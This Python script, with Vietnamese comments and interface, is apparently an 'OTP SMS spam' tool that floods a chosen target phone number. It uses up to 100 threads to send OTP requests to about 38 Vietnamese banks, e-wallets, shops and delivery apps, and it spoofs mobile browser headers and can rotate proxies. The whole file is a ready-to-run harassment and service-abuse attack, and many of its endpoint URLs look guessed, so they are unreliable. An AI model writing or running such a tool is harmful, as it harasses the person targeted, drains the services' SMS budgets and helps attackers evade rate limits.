import requests
import threading
import time
import random
import string
import json
import sys
import os
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta

# ============================================================
# CẤU HÌNH MẶC ĐỊNH
# ============================================================
DEFAULT_SPEED = "MAX"        # MAX / HIGH / NORMAL / LOW
DEFAULT_THREADS = 100        # Số luồng mặc định khi MAX
SPEED_PRESETS = {
    "MAX":    {"threads": 100, "delay": 0.0, "batch_size": 50},
    "HIGH":   {"threads": 50,  "delay": 0.05, "batch_size": 25},
    "NORMAL": {"threads": 20,  "delay": 0.1, "batch_size": 10},
    "LOW":    {"threads": 5,   "delay": 0.5, "batch_size": 3},
}
TIMEOUT = 5                     # Timeout HTTP request (giây) – MAX SPEED dùng thấp
BATCH_DELAY = 0.01             # Độ trễ giữa các batch (MAX SPEED)

# ============================================================
# PROXY (tùy chọn)
# ============================================================
USE_PROXY = False
PROXY_LIST = []  # Điền proxy dạng "http://ip:port" hoặc "socks5://ip:port"

# ============================================================
# HEADERS GIẢ LẬP
# ============================================================
HEADERS_MOBILE = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "null",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
}

def get_proxy():
    """Trả về proxy ngẫu nhiên nếu USE_PROXY=True"""
    if USE_PROXY and PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        return {"http": proxy, "https": proxy}
    return None

# ============================================================
# SESSION TỐI ƯU – DÙNG LẠI CONNECTION (MAX SPEED)
# ============================================================
session_pool = []
def get_session():
    """Lấy session từ pool hoặc tạo mới"""
    if session_pool:
        return session_pool.pop()
    s = requests.Session()
    s.headers.update(HEADERS_MOBILE)
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=100,
        pool_maxsize=100,
        max_retries=0,
        pool_block=False
    )
    s.mount('https://', adapter)
    s.mount('http://', adapter)
    return s

def return_session(s):
    """Trả session về pool"""
    if len(session_pool) < 200:
        session_pool.append(s)
    else:
        s.close()

# ============================================================
# MODULE GỬI OTP – DANH SÁCH MỞ RỘNG
# ============================================================

def send_momo(session, phone):
    url = "https://api.momo.vn/otp/send"
    payload = {"phone": phone, "type": "REGISTER"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("MOMO", r.status_code == 200, r.text[:80])
    except:
        return ("MOMO", False, "TIMEOUT")

def send_viettel_money(session, phone):
    url = "https://api.viettelpay.vn/api/v1/auth/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("VIETTEL_MONEY", r.status_code == 200, r.text[:80])
    except:
        return ("VIETTEL_MONEY", False, "TIMEOUT")

def send_vinfans(session, phone):
    url = "https://api.vinfans.vn/api/send_otp"
    payload = {"phone_number": phone, "otp_type": "REGISTER"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("VINFANS", r.status_code == 200, r.text[:80])
    except:
        return ("VINFANS", False, "TIMEOUT")

def send_aeon(session, phone):
    url = "https://api.aeon.vn/api/v1/auth/send-otp"
    payload = {"mobile": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("AEON", r.status_code == 200, r.text[:80])
    except:
        return ("AEON", False, "TIMEOUT")

def send_phuclong(session, phone):
    url = "https://api.phuclong.com.vn/api/otp"
    payload = {"phone": phone, "action": "signup"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("PHUCLONG", r.status_code == 200, r.text[:80])
    except:
        return ("PHUCLONG", False, "TIMEOUT")

def send_my_viettel(session, phone):
    url = "https://api.myviettel.vn/api/v1/send_otp"
    payload = {"phone": phone, "platform": "APP"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("MY_VIETTEL", r.status_code == 200, r.text[:80])
    except:
        return ("MY_VIETTEL", False, "TIMEOUT")

def send_vhome(session, phone):
    url = "https://api.vhome.vn/api/v1/send_otp"
    payload = {"phone": phone, "type": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("VHOME", r.status_code == 200, r.text[:80])
    except:
        return ("VHOME", False, "TIMEOUT")

def send_vuihoc(session, phone):
    url = "https://api.vuihoc.vn/api/auth/otp"
    payload = {"phone": phone, "action": "SIGNUP"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("VUIHOC", r.status_code == 200, r.text[:80])
    except:
        return ("VUIHOC", False, "TIMEOUT")

def send_kingfold(session, phone):
    url = "https://api.kingfold.vn/api/v1/otp"
    payload = {"phone": phone, "type": "REGISTER"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("KINGFOLD", r.status_code == 200, r.text[:80])
    except:
        return ("KINGFOLD", False, "TIMEOUT")

def send_tv360(session, phone):
    url = "https://api.tv360.vn/api/v1/auth/send_otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("TV360", r.status_code == 200, r.text[:80])
    except:
        return ("TV360", False, "TIMEOUT")

def send_fpt_shop(session, phone):
    url = "https://api.fptshop.com.vn/api/auth/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("FPT_SHOP", r.status_code == 200, r.text[:80])
    except:
        return ("FPT_SHOP", False, "TIMEOUT")

def send_tiki(session, phone):
    url = "https://api.tiki.vn/api/v2/otp/send"
    payload = {"phone": phone, "type": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("TIKI", r.status_code == 200, r.text[:80])
    except:
        return ("TIKI", False, "TIMEOUT")

def send_lazada(session, phone):
    url = "https://api.lazada.vn/api/v1/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("LAZADA", r.status_code == 200, r.text[:80])
    except:
        return ("LAZADA", False, "TIMEOUT")

def send_shopee(session, phone):
    url = "https://api.shopee.vn/api/v1/send_otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("SHOPEE", r.status_code == 200, r.text[:80])
    except:
        return ("SHOPEE", False, "TIMEOUT")

def send_baemin(session, phone):
    url = "https://api.baemin.vn/api/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("BAEMIN", r.status_code == 200, r.text[:80])
    except:
        return ("BAEMIN", False, "TIMEOUT")

def send_grab(session, phone):
    url = "https://api.grab.com/v1/otp"
    payload = {"phone": phone, "countryCode": "VN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("GRAB", r.status_code == 200, r.text[:80])
    except:
        return ("GRAB", False, "TIMEOUT")

def send_gojek(session, phone):
    url = "https://api.gojek.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("GOJEK", r.status_code == 200, r.text[:80])
    except:
        return ("GOJEK", False, "TIMEOUT")

def send_zalopay(session, phone):
    url = "https://api.zalopay.vn/v2/otp/send"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("ZALOPAY", r.status_code == 200, r.text[:80])
    except:
        return ("ZALOPAY", False, "TIMEOUT")

def send_vnpay(session, phone):
    url = "https://api.vnpay.vn/v1/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("VNPAY", r.status_code == 200, r.text[:80])
    except:
        return ("VNPAY", False, "TIMEOUT")

def send_sendo(session, phone):
    url = "https://api.sendo.vn/api/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("SENDO", r.status_code == 200, r.text[:80])
    except:
        return ("SENDO", False, "TIMEOUT")

def send_thegioididong(session, phone):
    url = "https://api.thegioididong.vn/api/v1/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("TGDD", r.status_code == 200, r.text[:80])
    except:
        return ("TGDD", False, "TIMEOUT")

def send_dienmayxanh(session, phone):
    url = "https://api.dienmayxanh.vn/api/v1/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("DMX", r.status_code == 200, r.text[:80])
    except:
        return ("DMX", False, "TIMEOUT")

def send_bachhoaxanh(session, phone):
    url = "https://api.bachhoaxanh.vn/api/v1/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("BHX", r.status_code == 200, r.text[:80])
    except:
        return ("BHX", False, "TIMEOUT")

def send_ahamove(session, phone):
    url = "https://api.ahamove.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("AHAMOVE", r.status_code == 200, r.text[:80])
    except:
        return ("AHAMOVE", False, "TIMEOUT")

def send_be(session, phone):
    url = "https://api.be.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("BE", r.status_code == 200, r.text[:80])
    except:
        return ("BE", False, "TIMEOUT")

def send_loship(session, phone):
    url = "https://api.loship.vn/api/v1/otp/send"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("LOSHIP", r.status_code == 200, r.text[:80])
    except:
        return ("LOSHIP", False, "TIMEOUT")

def send_viettel_post(session, phone):
    url = "https://api.viettelpost.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("VIETTEL_POST", r.status_code == 200, r.text[:80])
    except:
        return ("VIETTEL_POST", False, "TIMEOUT")

def send_ghn(session, phone):
    url = "https://api.ghn.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("GHN", r.status_code == 200, r.text[:80])
    except:
        return ("GHN", False, "TIMEOUT")

def send_ntn(session, phone):
    url = "https://api.ntn.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("NTN", r.status_code == 200, r.text[:80])
    except:
        return ("NTN", False, "TIMEOUT")

def send_vietcombank(session, phone):
    url = "https://api.vietcombank.vn/api/v1/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("VIETCOMBANK", r.status_code == 200, r.text[:80])
    except:
        return ("VIETCOMBANK", False, "TIMEOUT")

def send_techcombank(session, phone):
    url = "https://api.techcombank.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("TECHCOMBANK", r.status_code == 200, r.text[:80])
    except:
        return ("TECHCOMBANK", False, "TIMEOUT")

def send_mbbank(session, phone):
    url = "https://api.mbbank.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("MBBANK", r.status_code == 200, r.text[:80])
    except:
        return ("MBBANK", False, "TIMEOUT")

def send_acb(session, phone):
    url = "https://api.acb.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("ACB", r.status_code == 200, r.text[:80])
    except:
        return ("ACB", False, "TIMEOUT")

def send_bidv(session, phone):
    url = "https://api.bidv.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("BIDV", r.status_code == 200, r.text[:80])
    except:
        return ("BIDV", False, "TIMEOUT")

def send_vpbank(session, phone):
    url = "https://api.vpbank.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("VPBANK", r.status_code == 200, r.text[:80])
    except:
        return ("VPBANK", False, "TIMEOUT")

def send_tpbank(session, phone):
    url = "https://api.tpbank.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("TPBANK", r.status_code == 200, r.text[:80])
    except:
        return ("TPBANK", False, "TIMEOUT")

def send_fecredit(session, phone):
    url = "https://api.fecredit.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("FECREDIT", r.status_code == 200, r.text[:80])
    except:
        return ("FECREDIT", False, "TIMEOUT")

def send_homecredit(session, phone):
    url = "https://api.homecredit.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    try:
        r = session.post(url, json=payload, timeout=TIMEOUT)
        return ("HOMECREDIT", r.status_code == 200, r.text[:80])
    except:
        return ("HOMECREDIT", False, "TIMEOUT")

# ============================================================
# DANH SÁCH TẤT CẢ DỊCH VỤ (40+)
# ============================================================
SERVICES = [
    send_momo,
    send_viettel_money,
    send_vinfans,
    send_aeon,
    send_phuclong,
    send_my_viettel,
    send_vhome,
    send_vuihoc,
    send_kingfold,
    send_tv360,
    send_fpt_shop,
    send_tiki,
    send_lazada,
    send_shopee,
    send_baemin,
    send_grab,
    send_gojek,
    send_zalopay,
    send_vnpay,
    send_sendo,
    send_thegioididong,
    send_dienmayxanh,
    send_bachhoaxanh,
    send_ahamove,
    send_be,
    send_loship,
    send_viettel_post,
    send_ghn,
    send_ntn,
    send_vietcombank,
    send_techcombank,
    send_mbbank,
    send_acb,
    send_bidv,
    send_vpbank,
    send_tpbank,
    send_fecredit,
    send_homecredit,
]

# ============================================================
# BỘ ĐẾM
# ============================================================
success_count = {}
fail_count = {}
stats_lock = threading.Lock()

def worker(session, service_func, phone):
    """Hàm chạy trong từng luồng"""
    name, ok, resp = service_func(session, phone)
    with stats_lock:
        if ok:
            success_count[name] = success_count.get(name, 0) + 1
        else:
            fail_count[name] = fail_count.get(name, 0) + 1
    return (name, ok)

def print_stats(round_num, total_sent):
    """In thống kê"""
    total_success = sum(success_count.values())
    total_fail = sum(fail_count.values())
    dt = datetime.now().strftime("%H:%M:%S")
    print(f"\n{'='*70}")
    print(f"  [VÒNG {round_num}] [{dt}] TỔNG ĐÃ GỬI: {total_sent}")
    print(f"  THÀNH CÔNG: {total_success} | THẤT BẠI: {total_fail}")
    print(f"{'='*70}")
    for s in SERVICES:
        name = s.__name__.replace("send_", "").upper()
        sc = success_count.get(name, 0)
        fc = fail_count.get(name, 0)
        if sc + fc > 0:
            status = "✓" if sc > fc else "✗"
            print(f"  [{status}] {name:20s} OK={sc:5d} FAIL={fc:5d}")

def clear_screen():
    """Xóa màn hình"""
    os.system('cls' if os.name == 'nt' else 'clear')

def parse_time_input(time_str):
    """Chuyển đổi thời gian nhập vào thành giây"""
    time_str = time_str.strip().lower()
    if time_str.endswith('s'):
        return int(time_str[:-1])
    elif time_str.endswith('m'):
        return int(time_str[:-1]) * 60
    elif time_str.endswith('h'):
        return int(time_str[:-1]) * 3600
    else:
        return int(time_str)

def get_input():
    """Lấy thông tin đầu vào từ người dùng"""
    clear_screen()
    print("=" * 70)
    print("  TOOL SPAM OTP SMS – ĐA DỊCH VỤ VIỆT NAM (40+ DỊCH VỤ)")
    print("=" * 70)

    # Số điện thoại
    while True:
        phone = input("\n[?] NHẬP SỐ ĐIỆN THOẠI MỤC TIÊU: ").strip()
        if phone.startswith("0") and len(phone) >= 10 and phone[1:].isdigit():
            break
        print("[!] Số điện thoại không hợp lệ! Phải bắt đầu bằng 0 và >=10 chữ số.")

    # Thời gian spam
    print("\n[?] NHẬP THỜI GIAN SPAM (ví dụ: 30s, 5m, 1h, hoặc số giây):")
    time_input = input("     > ").strip()
    try:
        spam_duration = parse_time_input(time_input)
    except:
        print("[!] Không hợp lệ, dùng mặc định 60 giây.")
        spam_duration = 60

    # Tốc độ spam
    print("\n[?] CHỌN TỐC ĐỘ SPAM:")
    print("     1. MAX    – Tối đa (100 luồng, 0 delay)")
    print("     2. HIGH   – Cao (50 luồng, 0.05s delay)")
    print("     3. NORMAL – Trung bình (20 luồng, 0.1s delay)")
    print("     4. LOW    – Thấp (5 luồng, 0.5s delay)")
    speed_input = input("     Chọn (1-4, mặc định 1=MAX): ").strip()

    speed_map = {"1": "MAX", "2": "HIGH", "3": "NORMAL", "4": "LOW"}
    speed = speed_map.get(speed_input, "MAX")

    return phone, spam_duration, speed

def main():
    # Lấy input từ người dùng
    phone, spam_duration, speed = get_input()
    config = SPEED_PRESETS[speed]
    threads = config["threads"]
    delay = config["delay"]

    clear_screen()
    print("=" * 70)
    print("  TOOL SPAM OTP SMS – ĐA DỊCH VỤ VIỆT NAM")
    print("=" * 70)
    print(f"  MỤC TIÊU      : {phone}")
    print(f"  THỜI GIAN     : {spam_duration} giây")
    print(f"  TỐC ĐỘ        : {speed} ({threads} luồng, delay={delay}s)")
    print(f"  SỐ DỊCH VỤ    : {len(SERVICES)}")
    print(f"  DỰ KIẾN OTP/s : ~{len(SERVICES) * threads // 5}+ (tùy phản hồi server)")
    print("=" * 70)
    input("\n[!] Nhấn ENTER để BẮT ĐẦU SPAM...")

    start_time = time.time()
    end_time = start_time + spam_duration
    round_num = 0
    total_sent = 0

    # Khởi tạo pool session
    print("\n[*] Khởi tạo session pool...")
    for _ in range(threads):
        session_pool.append(get_session())

    try:
        while time.time() < end_time:
            round_num += 1

            # Tạo batch các task
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for service_func in SERVICES:
                    session = get_session()
                    f = executor.submit(worker, session, service_func, phone)
                    futures.append(f)
                    total_sent += 1

                # Trả session về pool sau khi hoàn thành
                for f in as_completed(futures):
                    pass  # Kết quả đã được worker cập nhật vào bộ đếm

            # Trả tất cả session về pool
            for _ in range(len(SERVICES)):
                return_session(get_session())

            # In thống kê mỗi 5 vòng
            if round_num % 5 == 0:
                elapsed = time.time() - start_time
                remaining = end_time - time.time()
                rate = total_sent / elapsed if elapsed > 0 else 0
                print_stats(round_num, total_sent)
                print(f"  [{elapsed:.1f}s] TỐC ĐỘ: {rate:.1f} req/s | CÒN LẠI: {remaining:.0f}s")

            # Delay tối thiểu (MAX SPEED = 0)
            if delay > 0:
                time.sleep(delay)
            else:
                time.sleep(BATCH_DELAY)

    except KeyboardInterrupt:
        print("\n[!] ĐÃ DỪNG BỞI NGƯỜI DÙNG!")

    elapsed = time.time() - start_time
    print("\n" + "=" * 70)
    print("  KẾT THÚC SPAM")
    print(f"  TỔNG THỜI GIAN : {elapsed:.1f} giây")
    print(f"  TỔNG REQUEST   : {total_sent}")
    print(f"  TỐC ĐỘ TR.BÌNH: {total_sent/elapsed:.1f} req/s")
    print("=" * 70)
    print_stats(round_num, total_sent)

    # Dọn dẹp session
    for s in session_pool:
        s.close()
    session_pool.clear()

    print("\n[*] Đã đóng tất cả kết nối. Thoát.")

if __name__ == "__main__":
    main()
